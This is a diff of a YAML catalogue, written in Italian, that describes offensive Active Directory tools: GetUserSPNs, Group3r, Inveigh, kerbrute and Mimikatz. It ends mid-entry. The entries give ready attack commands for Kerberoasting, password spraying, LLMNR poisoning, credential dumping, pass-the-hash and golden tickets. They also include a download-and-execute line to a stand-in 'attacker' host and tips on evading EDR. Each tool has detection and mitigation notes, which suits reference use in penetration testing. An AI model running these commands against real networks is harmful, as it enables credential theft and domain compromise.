-    recuperate e valutare privilege escalation paths</li></ol><br><hr><h4 class=\"rt-red\"\
-    >Rilevamento e mitigazioni</h4><p>Kerberoasting genera eventi 4769 (TGS requested)
-    sui Domain Controller. Difese mature monitorano:</p><ul><li>Richieste massive
-    di TGS in breve tempo</li><li>TGS per account con encryption type debole (RC4)</li><li>Richieste
-    da host non standard</li></ul><p>Mitigazioni: password lunghe (25+ char) per service
-    account, transition a Managed Service Account, monitoring di SPN sensibili.</p><br><hr>"
+  desc: "Esegue enum SPN utente e richiede TGS per kerberoasting, consentendo cracking offline di password di service account su domini AD"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GetUserSPNs_windows.exe</strong> è la compilazione Windows del tool Impacket per Kerberoasting. Enumera Service Principal Name (SPN) associati ad account utente e richiede TGS (Ticket Granting Service) che possono essere crackati offline per recuperare password di service account.</p><br><hr><h4 class=\"rt-purple\">Tecnica di attacco</h4><p>Il Kerberoasting sfrutta una caratteristica del protocollo Kerberos: qualsiasi utente di dominio autenticato può richiedere TGS per servizi che hanno SPN registrati. Questi ticket sono cifrati con l'hash della password del service account e possono essere estratti e crackati offline senza generare failed logon events.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Enumerazione SPN base:</strong></p><pre><code>GetUserSPNs.exe -dc-ip 192.168.1.10 acme.local/user:password</code></pre><p><strong>Request TGS con export:</strong></p><pre><code>GetUserSPNs.exe -request -dc-ip 192.168.1.10 -outputfile tgs.txt acme.local/user:password</code></pre><p><strong>Con hash NTLM:</strong></p><pre><code>GetUserSPNs.exe -hashes :aad3b435b51404ee... -dc-ip 192.168.1.10 -request acme.local/user</code></pre><p><strong>Targeting specifico:</strong></p><pre><code>GetUserSPNs.exe -request -dc-ip 192.168.1.10 acme.local/user:pass -target-user svc-sql</code></pre><br><hr><h4 class=\"rt-amber\">Pipeline completa</h4><ol><li>Eseguire enum SPN con GetUserSPNs</li><li>Richiedere TGS per account interessanti (evitare krbtgt e account computer)</li><li>Estrarre ticket in formato Hashcat/John (<code>-format hashcat/john</code>)</li><li>Crack offline: <code>hashcat -m 13100 tgs.txt wordlist.txt</code></li><li>Validare credenziali recuperate e valutare privilege escalation paths</li></ol><br><hr><h4 class=\"rt-red\">Rilevamento e mitigazioni</h4><p>Kerberoasting genera eventi 4769 (TGS requested) sui Domain Controller. Difese mature monitorano richieste massive di TGS in breve tempo, TGS per account con encryption type debole (RC4), richieste da host non standard. Mitigazioni: password lunghe (25+ char) per service account, transition a Managed Service Account, monitoring di SPN sensibili.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "group3r"
   name: "Group3r"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["gpo-audit", "misconfig-detection"]
+  installation: "GitHub"
   repo: "https://github.com/Group3r/Group3r"
-  desc: "Tool per enum GPO e analisi misconfigurazioni sfruttabili (script, MSI, path
-    SYSVOL writeable, ACL deboli) utili ad escalation"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Group3r</strong> è uno
-    strumento orientato all'attacco (non audit) per enumerare e analizzare Group Policy
-    Object alla ricerca di misconfigurazioni exploitable. A differenza di tool audit-oriented,
-    Group3r filtra finding per sfruttabilità immediata, evidenziando path di privilege
-    escalation e lateral movement.</p><br><hr><h4 class=\"rt-purple\">Categorie di finding</h4><p><strong>Script
-    e MSI distribuiti:</strong> Identifica script di logon/startup e MSI package deployati
-    via GPO che potrebbero essere modificabili o contenere credenziali.</p><p><strong>Path
-    SYSVOL writeable:</strong> Rileva percorsi in SYSVOL con ACL deboli dove un attacker
-    potrebbe iniettare payload eseguiti al logon utente.</p><p><strong>ACL modificabili:</strong>
-    Enumera GPO dove l'attacker ha diritti di modifica (Write, WriteProperty, WriteDacl)
-    permettendo injection di configurazioni dannose.</p><p><strong>Credenziali in
-    chiaro:</strong> Cerca password in Group Policy Preferences (cpassword), script
-    batch/PowerShell e scheduled task.</p><p><strong>Riferimenti a share:</strong>
-    Identifica UNC path a file share che potrebbero essere sfruttati per NTLM relay
-    o DLL hijacking.</p><br><hr><h4 class=\"rt-green\">Modalità di esecuzione</h4><p><strong>Scansione
-    completa:</strong></p><pre><code>.\\Group3r.exe -f GPO_output.html</code></pre><p><strong>Solo
-    finding high severity:</strong></p><pre><code>.\\Group3r.exe -s 4 -f findings.html</code></pre><p><strong>Output
-    JSON per parsing:</strong></p><pre><code>.\\Group3r.exe -o json -f results.json</code></pre><p><strong>Modalità
-    offline:</strong></p><pre><code>.\\Group3r.exe -g C:\\Path\\To\\GPO\\ -f offline.html</code></pre><br><hr><h4
-    class=\"rt-amber\">Integration in attack path</h4><ul><li>Eseguire dopo initial
-    foothold su dominio</li><li>Correlare con output di BloodHound per attack path
-    completi</li><li>Prioritizzare GPO con applicazione a gruppi privilegiati</li><li>Testare
-    modificabilità effettiva prima di exploitation</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni
-    operative</h4><p>Group3r comunica con Domain Controller via LDAP e accede a SYSVOL
-    via SMB, generando traffico rilevabile. L'accesso a SYSVOL con account low-privilege
-    è legittimo ma pattern di enumerazione massiva possono alertare SOC. Output reports
-    contengono informazioni sensibili: proteggere e limitare diffusione.</p><br><hr>"
+  desc: "Tool per enum GPO e analisi misconfigurazioni sfruttabili (script, MSI, path SYSVOL writeable, ACL deboli) utili ad escalation"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Group3r</strong> è uno strumento orientato all'attacco per enumerare e analizzare Group Policy Object alla ricerca di misconfigurazioni exploitable. A differenza di tool audit-oriented, Group3r filtra finding per sfruttabilità immediata, evidenziando path di privilege escalation e lateral movement.</p><br><hr><h4 class=\"rt-purple\">Categorie di finding</h4><p><strong>Script e MSI distribuiti:</strong> Identifica script di logon/startup e MSI package deployati via GPO che potrebbero essere modificabili o contenere credenziali.</p><p><strong>Path SYSVOL writeable:</strong> Rileva percorsi in SYSVOL con ACL deboli dove un attacker potrebbe iniettare payload eseguiti al logon utente.</p><p><strong>ACL modificabili:</strong> Enumera GPO dove l'attacker ha diritti di modifica (Write, WriteProperty, WriteDacl) permettendo injection di configurazioni dannose.</p><p><strong>Credenziali in chiaro:</strong> Cerca password in Group Policy Preferences (cpassword), script batch/PowerShell e scheduled task.</p><p><strong>Riferimenti a share:</strong> Identifica UNC path a file share che potrebbero essere sfruttati per NTLM relay o DLL hijacking.</p><br><hr><h4 class=\"rt-green\">Modalità di esecuzione</h4><p><strong>Scansione completa:</strong></p><pre><code>.\\Group3r.exe -f GPO_output.html</code></pre><p><strong>Solo finding high severity:</strong></p><pre><code>.\\Group3r.exe -s 4 -f findings.html</code></pre><p><strong>Output JSON per parsing:</strong></p><pre><code>.\\Group3r.exe -o json -f results.json</code></pre><p><strong>Modalità offline:</strong></p><pre><code>.\\Group3r.exe -g C:\\Path\\To\\GPO\\ -f offline.html</code></pre><br><hr><h4 class=\"rt-amber\">Integration in attack path</h4><ul><li>Eseguire dopo initial foothold su dominio</li><li>Correlare con output di BloodHound per attack path completi</li><li>Prioritizzare GPO con applicazione a gruppi privilegiati</li><li>Testare modificabilità effettiva prima di exploitation</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni operative</h4><p>Group3r comunica con Domain Controller via LDAP e accede a SYSVOL via SMB, generando traffico rilevabile. L'accesso a SYSVOL con account low-privilege è legittimo ma pattern di enumerazione massiva possono alertare SOC. Output reports contengono informazioni sensibili: proteggere e limitare diffusione.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "inveigh-exe"
   name: "Inveigh.exe"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["mitm", "llmnr-nbns-mdns", "hash-capture", "relay-support"]
+  installation: "GitHub"
   repo: "https://github.com/Kevin-Robertson/Inveigh"
-  desc: "Strumento .NET cross-platform per MITM con spoofing LLMNR/NBNS/mDNS, listener
-    HTTP/SMB e cattura hash NetNTLM con supporto relay"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Inveigh.exe</strong>
-    è l'implementazione .NET Core di Inveigh, uno strumento completo per Man-in-the-Middle
-    su reti Windows. Supporta poisoning di protocolli di risoluzione nome (LLMNR,
-    NBNS, mDNS) e listener per catturare challenge-response NetNTLM, con capacità
-    di relay avanzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Spoofers:</strong><ul><li>LLMNR
-    (Link-Local Multicast Name Resolution)</li><li>NBNS (NetBIOS Name Service)</li><li>mDNS
-    (multicast DNS)</li><li>DHCPv6 spoofing</li><li>DNS server rogue</li></ul></p><p><strong>Listener:</strong><ul><li>HTTP/HTTPS
-    con NTLMv1/v2 authentication</li><li>SMB con firma disabilitata</li><li>LDAP per
-    cattura credenziali directory</li><li>WebDAV</li><li>Proxy authentication capture</li></ul></p><p><strong>Capture
-    e relay:</strong> Salva NetNTLM challenge/response in formato Hashcat/John e supporta
-    relay verso SMB, HTTP, LDAP per escalation.</p><br><hr><h4 class=\"rt-green\">Esempi operativi</h4><p><strong>LLMNR/NBNS
-    poisoning base:</strong></p><pre><code>Inveigh.exe</code></pre><p><strong>Solo
-    HTTP listener:</strong></p><pre><code>Inveigh.exe -LLMNR N -NBNS N -HTTP Y</code></pre><p><strong>Con
-    filtri dominio:</strong></p><pre><code>Inveigh.exe -SpooferHostsIgnore host1,host2
-    -SpooferIPsIgnore 192.168.1.10</code></pre><p><strong>Inspect mode (no spoofing):</strong></p><pre><code>Inveigh.exe
-    -Inspect</code></pre><p><strong>Output file:</strong></p><pre><code>Inveigh.exe
-    -FileOutput Y -FileOutputDirectory C:\\Temp\\Inveigh</code></pre><br><hr><h4 class=\"\
-    rt-amber\">Scenari d'uso</h4><ul><li>Internal recon per identificare host che
-    fallback a LLMNR/NBNS</li><li>Credential harvesting su segmenti non monitorati</li><li>Setup
-    per NTLM relay attacks verso target privilegiati</li><li>Validation di security
-    posture (LLMNR/NBNS disabilitati?)</li></ul><br><hr><h4 class=\"rt-red\">OPSEC e rilevamento</h4><p>Spoofing
-    genera traffico anomalo rilevabile da NDR/IDS. Risposte rogue a query LLMNR/NBNS
-    possono causare disruption di servizi legittimi. Best practice:</p><ul><li>Usare
-    ignore lists per escludere host critici</li><li>Limitare durata dell'attacco a
-    finestre concordate</li><li>Monitorare console per traffico catturato e fermare
-    se eccessivo</li><li>Preferire modalità passiva (Inspect) per baseline prima di
-    active poisoning</li></ul><p>SMB signing e LDAP channel binding sono mitigazioni
-    efficaci: verificare configurazione target prima di relay attempts.</p><br><hr>"
+  desc: "Strumento .NET cross-platform per MITM con spoofing LLMNR/NBNS/mDNS, listener HTTP/SMB e cattura hash NetNTLM con supporto relay"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Inveigh.exe</strong> è l'implementazione .NET Core di Inveigh, uno strumento completo per Man-in-the-Middle su reti Windows. Supporta poisoning di protocolli di risoluzione nome (LLMNR, NBNS, mDNS) e listener per catturare challenge-response NetNTLM, con capacità di relay avanzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Spoofers:</strong> LLMNR (Link-Local Multicast Name Resolution), NBNS (NetBIOS Name Service), mDNS (multicast DNS), DHCPv6 spoofing, DNS server rogue.</p><p><strong>Listener:</strong> HTTP/HTTPS con NTLMv1/v2 authentication, SMB con firma disabilitata, LDAP per cattura credenziali directory, WebDAV, Proxy authentication capture.</p><p><strong>Capture e relay:</strong> Salva NetNTLM challenge/response in formato Hashcat/John e supporta relay verso SMB, HTTP, LDAP per escalation.</p><br><hr><h4 class=\"rt-green\">Esempi operativi</h4><p><strong>LLMNR/NBNS poisoning base:</strong></p><pre><code>Inveigh.exe</code></pre><p><strong>Solo HTTP listener:</strong></p><pre><code>Inveigh.exe -LLMNR N -NBNS N -HTTP Y</code></pre><p><strong>Con filtri dominio:</strong></p><pre><code>Inveigh.exe -SpooferHostsIgnore host1,host2 -SpooferIPsIgnore 192.168.1.10</code></pre><p><strong>Inspect mode (no spoofing):</strong></p><pre><code>Inveigh.exe -Inspect</code></pre><p><strong>Output file:</strong></p><pre><code>Inveigh.exe -FileOutput Y -FileOutputDirectory C:\\Temp\\Inveigh</code></pre><br><hr><h4 class=\"rt-amber\">Scenari d'uso</h4><ul><li>Internal recon per identificare host che fallback a LLMNR/NBNS</li><li>Credential harvesting su segmenti non monitorati</li><li>Setup per NTLM relay attacks verso target privilegiati</li><li>Validation di security posture (LLMNR/NBNS disabilitati?)</li></ul><br><hr><h4 class=\"rt-red\">OPSEC e rilevamento</h4><p>Spoofing genera traffico anomalo rilevabile da NDR/IDS. Risposte rogue a query LLMNR/NBNS possono causare disruption di servizi legittimi. Best practice: usare ignore lists per escludere host critici, limitare durata dell'attacco a finestre concordate, monitorare console per traffico catturato, preferire modalità passiva (Inspect) per baseline prima di active poisoning. SMB signing e LDAP channel binding sono mitigazioni efficaci.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "inveigh-ps1"
   name: "Inveigh.ps1"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["mitm", "llmnr-nbns-mdns", "hash-capture"]
+  installation: "GitHub"
   repo: "https://github.com/Kevin-Robertson/Inveigh"
-  desc: "Versione PowerShell di Inveigh per MITM fileless con spoofing LLMNR/NBNS/mDNS
-    e cattura hash NetNTLM in scenari con restrizioni binari"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Inveigh.ps1</strong>
-    è la versione PowerShell legacy di Inveigh, ottimizzata per deployment fileless
-    e scenari dove l'esecuzione di binari è limitata. Mantiene le funzionalità core
-    di poisoning e hash capture con footprint ridotto.</p><br><hr><h4 class=\"rt-purple\"\
-    >Vantaggi deployment PowerShell</h4><ul><li><strong>Fileless execution:</strong>
-    Può essere caricato direttamente in memoria senza toccare disco</li><li><strong>Evasion:</strong>
-    Meno rilevabile da AV/EDR rispetto a binari .NET</li><li><strong>Integrazione:</strong>
-    Facile inclusione in framework post-exploitation (Empire, Covenant)</li><li><strong>Portabilità:</strong>
-    Single-file deployment senza dipendenze</li></ul><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Import
-    e start base:</strong></p><pre><code>PS> . .\\Inveigh.ps1<br>PS> Invoke-Inveigh</code></pre><p><strong>Parametri
-    comuni:</strong></p><pre><code>PS> Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR
-    Y -HTTP Y</code></pre><p><strong>Fileless da remoto:</strong></p><pre><code>PS>
-    IEX (New-Object Net.WebClient).DownloadString('http://attacker/Inveigh.ps1')<br>PS>
-    Invoke-Inveigh -RunTime 30</code></pre><p><strong>Con output file:</strong></p><pre><code>PS>
-    Invoke-Inveigh -FileOutput Y -FileOutputDirectory C:\\Temp</code></pre><br><hr><h4 class=\"\
-    rt-amber\">Inveigh-Relay</h4><p>La repo include anche <code>Inveigh-Relay.ps1</code>
-    per scenari SMB relay:<br><code>PS> Invoke-InveighRelay -Target 192.168.1.10 -Command
-    \"cmd.exe /c whoami > C:\\relay.txt\"</code></p><p>Utile per escalation quando
-    SMB signing è disabilitato su host target.</p><br><hr><h4 class=\"rt-red\">Limitazioni
-    e mitigazioni</h4><p><strong>Permessi richiesti:</strong> Amministratore locale
-    necessario per sniffing raw sockets e binding porte privilegiate (53, 137, etc.)</p><p><strong>Telemetrie
-    difensive:</strong><ul><li>PowerShell logging (module/script block logging) cattura
-    l'intero script</li><li>AMSI può rilevare pattern noti in memoria</li><li>Constrained
-    Language Mode limita funzionalità reflection</li></ul></p><p><strong>Alternative
-    moderne:</strong> Per engagement recenti considerare la versione .NET (Inveigh.exe)
-    che offre maggiore stabilità e feature set esteso. Inveigh.ps1 rimane valida per
-    quick-ops e ambienti con .NET non disponibile.</p><br><hr>"
+  desc: "Versione PowerShell di Inveigh per MITM fileless con spoofing LLMNR/NBNS/mDNS e cattura hash NetNTLM in scenari con restrizioni binari"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Inveigh.ps1</strong> è la versione PowerShell legacy di Inveigh, ottimizzata per deployment fileless e scenari dove l'esecuzione di binari è limitata. Mantiene le funzionalità core di poisoning e hash capture con footprint ridotto.</p><br><hr><h4 class=\"rt-purple\">Vantaggi deployment PowerShell</h4><ul><li><strong>Fileless execution:</strong> Può essere caricato direttamente in memoria senza toccare disco</li><li><strong>Evasion:</strong> Meno rilevabile da AV/EDR rispetto a binari .NET</li><li><strong>Integrazione:</strong> Facile inclusione in framework post-exploitation (Empire, Covenant)</li><li><strong>Portabilità:</strong> Single-file deployment senza dipendenze</li></ul><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Import e start base:</strong></p><pre><code>PS> . .\\Inveigh.ps1\nPS> Invoke-Inveigh</code></pre><p><strong>Parametri comuni:</strong></p><pre><code>PS> Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -HTTP Y</code></pre><p><strong>Fileless da remoto:</strong></p><pre><code>PS> IEX (New-Object Net.WebClient).DownloadString('http://attacker/Inveigh.ps1')
+PS> Invoke-Inveigh -RunTime 30</code></pre><p><strong>Con output file:</strong></p><pre><code>PS> Invoke-Inveigh -FileOutput Y -FileOutputDirectory C:\\Temp</code></pre><br><hr><h4 class=\"rt-amber\">Inveigh-Relay</h4><p>La repo include anche <code>Inveigh-Relay.ps1</code> per scenari SMB relay:<br><code>PS> Invoke-InveighRelay -Target 192.168.1.10 -Command \"cmd.exe /c whoami > C:\\relay.txt\"</code></p><p>Utile per escalation quando SMB signing è disabilitato su host target.</p><br><hr><h4 class=\"rt-red\">Limitazioni e mitigazioni</h4><p><strong>Permessi richiesti:</strong> Amministratore locale necessario per sniffing raw sockets e binding porte privilegiate (53, 137, etc.)</p><p><strong>Telemetrie difensive:</strong> PowerShell logging (module/script block logging) cattura l'intero script, AMSI può rilevare pattern noti in memoria, Constrained Language Mode limita funzionalità reflection.</p><p><strong>Alternative moderne:</strong> Per engagement recenti considerare la versione .NET (Inveigh.exe) che offre maggiore stabilità e feature set esteso.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "kerbrute-win"
   name: "kerbrute_Windows.exe"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["user-enum", "password-spraying", "kerberos-preauth"]
+  installation: "GitHub"
   repo: "https://github.com/ropnop/kerbrute"
-  desc: "Tool Go per user enumeration e password spraying via Kerberos pre-auth a
-    basso rumore, evitando traffico SMB/LDAP su domini AD"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>kerbrute_Windows.exe</strong>
-    è un tool scritto in Go per user enumeration e password spraying su Active Directory
-    che comunica direttamente con il KDC (Key Distribution Center) via protocollo
-    Kerberos (porta 88 TCP/UDP), evitando protocolli più rumorosi come SMB e LDAP.</p><br><hr><h4
-    class=\"rt-purple\">Vantaggi operativi</h4><p><strong>Basso profilo:</strong>
-    Le richieste AS-REQ verso il KDC sono traffico legittimo e meno monitorate di
-    failed logon su SMB. Non genera eventi 4625 (failed logon) ma solo 4768 (TGT requested)
-    o 4771 (pre-auth failed).</p><p><strong>Velocità:</strong> Scritto in Go con concorrenza
-    nativa, può testare migliaia di username/password rapidamente rispettando rate
-    limit configurabili.</p><p><strong>Precision:</strong> AS-REQ fallite con error
-    code specifici distinguono account inesistenti da password errate, eliminando
-    false positive.</p><br><hr><h4 class=\"rt-green\">Comandi principali</h4><p><strong>User
-    enumeration:</strong></p><pre><code>kerbrute_windows.exe userenum -d acme.local
-    --dc 192.168.1.10 users.txt</code></pre><p><strong>Password spraying:</strong></p><pre><code>kerbrute_windows.exe
-    passwordspray -d acme.local users.txt Password123! --delay 2s</code></pre><p><strong>Brute
-    force (sconsigliato):</strong></p><pre><code>kerbrute_windows.exe bruteuser -d
-    acme.local passwords.txt admin --delay 5s</code></pre><p><strong>Con output file:</strong></p><pre><code>kerbrute_windows.exe
-    userenum -d acme.local users.txt -o valid-users.txt</code></pre><br><hr><h4 class=\"rt-amber\"\
-    >Best practice</h4><ul><li>Sempre specificare <code>--delay</code> per rispettare
-    lockout policy (minimo 1-2 secondi)</li><li>Usare IP diretto del DC con <code>--dc</code>
-    per evitare DNS lookup ripetuti</li><li>Limitare concorrenza con <code>-t</code>
-    su reti lente o DC sovraccarichi</li><li>Testare prima con piccoli subset per
-    validare formato userlist</li><li>Salvare output per correlare con altre fonti
-    (BloodHound, LDAP enum)</li></ul><br><hr><h4 class=\"rt-red\">Rilevamento e mitigazioni</h4><p>SOC
-    maturi monitorano:</p><ul><li>Spike di eventi 4771 da singolo IP</li><li>AS-REQ
-    con encryption type debole (RC4)</li><li>Pattern temporali anomali (burst vs.
-    traffico utente normale)</li></ul><p>Mitigazioni difensive: pre-auth obbligatoria
-    per tutti gli account, monitoring 4771, rate limiting a livello firewall/KDC.</p><br><hr>"
+  desc: "Tool Go per user enumeration e password spraying via Kerberos pre-auth a basso rumore, evitando traffico SMB/LDAP su domini AD"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>kerbrute_Windows.exe</strong> è un tool scritto in Go per user enumeration e password spraying su Active Directory che comunica direttamente con il KDC (Key Distribution Center) via protocollo Kerberos (porta 88 TCP/UDP), evitando protocolli più rumorosi come SMB e LDAP.</p><br><hr><h4 class=\"rt-purple\">Vantaggi operativi</h4><p><strong>Basso profilo:</strong> Le richieste AS-REQ verso il KDC sono traffico legittimo e meno monitorate di failed logon su SMB. Non genera eventi 4625 (failed logon) ma solo 4768 (TGT requested) o 4771 (pre-auth failed).</p><p><strong>Velocità:</strong> Scritto in Go con concorrenza nativa, può testare migliaia di username/password rapidamente rispettando rate limit configurabili.</p><p><strong>Precision:</strong> AS-REQ fallite con error code specifici distinguono account inesistenti da password errate, eliminando false positive.</p><br><hr><h4 class=\"rt-green\">Comandi principali</h4><p><strong>User enumeration:</strong></p><pre><code>kerbrute_windows.exe userenum -d acme.local --dc 192.168.1.10 users.txt</code></pre><p><strong>Password spraying:</strong></p><pre><code>kerbrute_windows.exe passwordspray -d acme.local users.txt Password123! --delay 2s</code></pre><p><strong>Brute force (sconsigliato):</strong></p><pre><code>kerbrute_windows.exe bruteuser -d acme.local passwords.txt admin --delay 5s</code></pre><p><strong>Con output file:</strong></p><pre><code>kerbrute_windows.exe userenum -d acme.local users.txt -o valid-users.txt</code></pre><br><hr><h4 class=\"rt-amber\">Best practice</h4><ul><li>Sempre specificare <code>--delay</code> per rispettare lockout policy (minimo 1-2 secondi)</li><li>Usare IP diretto del DC con <code>--dc</code> per evitare DNS lookup ripetuti</li><li>Limitare concorrenza con <code>-t</code> su reti lente o DC sovraccarichi</li><li>Testare prima con piccoli subset per validare formato userlist</li><li>Salvare output per correlare con altre fonti (BloodHound, LDAP enum)</li></ul><br><hr><h4 class=\"rt-red\">Rilevamento e mitigazioni</h4><p>SOC maturi monitorano spike di eventi 4771 da singolo IP, AS-REQ con encryption type debole (RC4), pattern temporali anomali (burst uniform). Mitigazioni difensive: pre-auth obbligatoria per tutti account, monitoring 4771, rate limiting a livello firewall/KDC.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "mimikatz"
   name: "Mimikatz"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["credential-dumping", "tickets", "pth", "ptt"]
+  installation: "GitHub"
   repo: "https://github.com/gentilkiwi/mimikatz"
-  desc: "Toolkit post-exploitation per dump credenziali Windows (LSA/DPAPI/Kerberos),
-    Pass-the-Hash/Ticket e generazione Golden/Silver ticket"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mimikatz</strong> di
-    Benjamin Delpy è il tool di riferimento per credential dumping e manipolazione
-    Kerberos su Windows. Estrae credenziali da memoria, DPAPI, SAM/LSA, manipola ticket
-    Kerberos e implementa tecniche avanzate di lateral movement e persistence.</p><br><hr><h4
-    class=\"rt-purple\">Moduli principali</h4><p><strong>sekurlsa:</strong> Estrae
-    credenziali da processi LSASS:</p><ul><li><code>sekurlsa::logonpasswords</code>
-    - Dump password plaintext/hash/ticket da tutte le sessioni</li><li><code>sekurlsa::ekeys</code>
-    - Estrae encryption keys Kerberos</li><li><code>sekurlsa::tickets</code> - Export
-    TGT/TGS tickets</li><li><code>sekurlsa::pth</code> - Pass-the-Hash per aprire
-    sessioni</li></ul></p><p><strong>kerberos:</strong> Manipolazione ticket:</p><ul><li><code>kerberos::ptt</code>
-    - Pass-the-Ticket (inject TGT/TGS)</li><li><code>kerberos::golden</code> - Genera
-    Golden Ticket (richiede krbtgt hash)</li><li><code>kerberos::silver</code> - Genera
-    Silver Ticket per servizi specifici</li><li><code>kerberos::list</code> - Lista
-    ticket in cache</li></ul></p><p><strong>lsadump:</strong> Dump secrets locali
-    e DC:</p><ul><li><code>lsadump::sam</code> - Estrae hash da SAM locale</li><li><code>lsadump::lsa
-    /patch</code> - Dump LSA secrets da memoria</li><li><code>lsadump::dcsync</code>
-    - Replica secrets da DC (richiede replication rights)</li></ul></p><p><strong>dpapi:</strong>
-    Decrypt secrets protetti da Data Protection API (credenziali browser, RDP, WiFi).</p><br><hr><h4
-    class=\"rt-green\">Workflow tipico</h4><p><strong>1. Elevazione privilegi:</strong></p><pre><code>mimikatz
-    # privilege::debug<br>mimikatz # token::elevate</code></pre><p><strong>2. Dump
-    credenziali:</strong></p><pre><code>mimikatz # sekurlsa::logonpasswords</code></pre><p><strong>3.
-    Pass-the-Hash:</strong></p><pre><code>mimikatz # sekurlsa::pth /user:admin /domain:acme.local
-    /ntlm:hash /run:cmd.exe</code></pre><p><strong>4. Golden Ticket (persistence):</strong></p><pre><code>mimikatz
-    # kerberos::golden /domain:acme.local /sid:S-1-5-21... /rc4:krbtgt_hash /user:fakeadmin
-    /ptt</code></pre><br><hr><h4 class=\"rt-amber\">Tecniche avanzate</h4><ul><li><strong>DCSync:</strong>
-    Replica password hashes da DC senza accesso fisico</li><li><strong>Skeleton Key:</strong>
-    Backdoor autenticazione su DC per password master</li><li><strong>Zerologon:</strong>
-    Reset password computer account DC (CVE-2020-1472)</li><li><strong>DPAPI abuse:</strong>
-    Decrypt credenziali di altri utenti con master keys</li></ul><br><hr><h4 class=\"rt-red\"\
-    >Rilevamento e OPSEC</h4><p><strong>Signature rilevabili:</strong><ul><li>Accesso
-    a LSASS.exe (Sysmon Event ID 10)</li><li>Caricamento driver mimikatz (mimidrv.sys)</li><li>Pattern
-    in memoria riconosciuti da EDR</li><li>DCSync genera eventi 4662 (replication)</li></ul></p><p><strong>Tecniche
-    evasion:</strong><ul><li>Eseguire da memoria con invoke-mimikatz.ps1</li><li>Offuscare
-    stringhe e rebuild custom</li><li>Usare process injection invece di esecuzione
-    diretta</li><li>Limitare dump a processi specifici</li></ul></p><p><strong>Mitigazioni
-    difensive:</strong> Credential Guard, WDigest disabilitato (Win 8.1+), LSASS protection,
-    Restricted Admin mode RDP, monitoring accessi LSASS.</p><br><hr>"
+  desc: "Toolkit post-exploitation per dump credenziali Windows (LSA/DPAPI/Kerberos), Pass-the-Hash/Ticket e generazione Golden/Silver ticket"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mimikatz</strong> di Benjamin Delpy è il tool di riferimento per credential dumping e manipolazione Kerberos su Windows. Estrae credenziali da memoria, DPAPI, SAM/LSA, manipola ticket Kerberos e implementa tecniche avanzate di lateral movement e persistence.</p><br><hr><h4 class=\"rt-purple\">Moduli principali</h4><p><strong>sekurlsa:</strong> Estrae credenziali da processi LSASS: <code>sekurlsa::logonpasswords</code> (dump password plaintext/hash/ticket), <code>sekurlsa::ekeys</code> (estrae encryption keys Kerberos), <code>sekurlsa::tickets</code> (export TGT/TGS), <code>sekurlsa::pth</code> (Pass-the-Hash).</p><p><strong>kerberos:</strong> Manipolazione ticket: <code>kerberos::ptt</code> (Pass-the-Ticket), <code>kerberos::golden</code> (genera Golden Ticket), <code>kerberos::silver</code> (genera Silver Ticket), <code>kerberos::list</code> (lista ticket in cache).</p><p><strong>lsadump:</strong> Dump secrets locali e DC: <code>lsadump::sam</code> (estrae hash da SAM locale), <code>lsadump::lsa /patch</code> (dump LSA secrets), <code>lsadump::dcsync</code> (replica secrets da DC).</p><p><strong>dpapi:</strong> Decrypt secrets protetti da Data Protection API (credenziali browser, RDP, WiFi).</p><br><hr><h4 class=\"rt-green\">Workflow tipico</h4><p><strong>1. Elevazione privilegi:</strong></p><pre><code>mimikatz # privilege::debug
